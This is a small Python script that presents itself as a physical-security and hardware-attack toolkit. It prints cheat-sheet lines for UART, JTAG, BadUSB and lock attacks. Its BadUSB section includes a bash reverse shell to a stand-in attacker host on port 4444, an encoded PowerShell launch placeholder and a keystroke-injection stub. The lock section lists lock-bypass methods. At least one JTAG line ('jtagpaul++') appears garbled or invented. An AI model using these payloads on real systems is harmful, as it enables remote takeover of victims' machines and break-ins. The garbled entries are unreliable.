#!/usr/bin/env python3
"""
PHYSICAL-OPS — Physical Security & Hardware Attacks
Run: python3 Skills/physical-ops/scripts/physical_ops.py <action>
Actions: uart, jtag, badusb, lock
"""
import sys

PAYLOADS = {
    'uart': [
        "Connect: GND->GND, RX->TX, TX->RX at 115200 8N1",
        "screen /dev/ttyUSB0 115200",
        "stty -F /dev/ttyUSB0 115200 raw",
        "echo 'AT' > /dev/ttyUSB0"
    ],
    'jtag': [
        "JTAG Pinout: TCK, TMS, TDI, TDO, GND, Vref",
        "OpenOCD: openocd -f interface/jlink.cfg -f target/stm32.cfg",
        "urjtag: jtagpaul++",
        "JTAGenum: arduino jtagenum.ino"
    ],
    'badusb': [
        "DuckyScript: DELAY 1000 | GUI r | STRING cmd",
        "bash -i > /dev/tcp/attacker/4444 0>&1",
        "powershell -enc base64_shell",
        "HID aliases via Teensy"
    ],
    'lock': [
        "Shim method: 3D printed wafer key shim",
        "Bump keys: apply torsion + impact",
        "Decoder scope: view pin depths",
        "Lishi picks: profile matching"
    ]
}

def main():
    action = sys.argv[1] if len(sys.argv) > 1 else 'help'
    
    if action in PAYLOADS:
        print(f"=== {action.upper()} ===")
        for p in PAYLOADS[action]:
            print(p)
    else:
        print("Usage: physical_ops.py <action>")
        print("Actions:", list(PAYLOADS.keys()))
        sys.exit(1)

if __name__ == '__main__':
    main()